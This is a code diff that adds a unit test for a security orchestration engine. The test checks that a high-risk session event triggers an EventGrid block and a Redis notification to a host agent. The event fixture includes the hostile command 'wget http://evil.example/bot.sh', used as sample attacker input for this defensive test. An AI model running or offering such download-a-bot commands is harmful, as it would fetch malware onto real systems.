@@ -4,6 +4,7 @@ from __future__ import annotations
 
 import asyncio
 import importlib.util
+import json
 import sys
 import types
 from pathlib import Path
@@ -169,6 +170,75 @@ async def test_soar_publishes_block_to_eventgrid(monkeypatch) -> None:
     assert calls[0]["ip"] == "8.8.8.8"
     assert calls[0]["endpoint"] == "https://topic.example.com/api/events"
     assert calls[0]["key"] == "unit-key"
+
+
+class _FakeRedis:
+    def __init__(self) -> None:
+        self.store: dict[str, object] = {}
+        self.published: list[tuple[str, str]] = []
+
+    async def get(self, key: str):
+        return self.store.get(key)
+
+    async def set(self, key: str, value: object, ex: int | None = None) -> bool:
+        self.store[key] = value
+        return True
+
+    async def exists(self, key: str) -> int:
+        return 1 if key in self.store else 0
+
+    async def smembers(self, _key: str) -> set[str]:
+        return set()
+
+    async def sadd(self, _key: str, *values: str) -> int:
+        return len(values)
+
+    async def expire(self, _key: str, _ttl: int) -> bool:
+        return True
+
+    async def delete(self, *_keys: str) -> int:
+        return 1
+
+    async def publish(self, channel: str, payload: str) -> int:
+        self.published.append((channel, payload))
+        return 1
+
+    async def aclose(self) -> None:
+        return None
+
+
+@pytest.mark.asyncio
+async def test_soar_eventgrid_also_notifies_host_agent(monkeypatch) -> None:
+    async def fake_publish(**kwargs):
+        return True, ""
+
+    monkeypatch.setattr("cloudsentinel.soar.publish_block", fake_publish)
+    from cloudsentinel.soar import SOAREngine
+
+    engine = SOAREngine(
+        risk_threshold=30,
+        firewall_enabled=True,
+        firewall_dry_run=False,
+        allowlist=["127.0.0.1"],
+        eventgrid_enabled=True,
+        eventgrid_endpoint="https://topic.example.com/api/events",
+        eventgrid_key="unit-key",
+    )
+    fake_redis = _FakeRedis()
+    engine._redis = fake_redis
+    event = {
+        "eventid": "cloudsentinel.command.input",
+        "src_ip": "8.8.8.8",
+        "session": "s1",
+        "input": "wget http://evil.example/bot.sh",
+        "cloudsentinel_risk_score": 100,
+    }
+    result = await engine.process_event("s1", event)
+    assert result["cloudsentinel_soar_action"] == "eventgrid_published"
+    assert fake_redis.published
+    channel, payload = fake_redis.published[0]
+    assert channel == "cloudsentinel:soar:blocks"
+    assert json.loads(payload)["ip"] == "8.8.8.8"
 
 
 def test_vault_reads_kv_v2_path(monkeypatch) -> None:
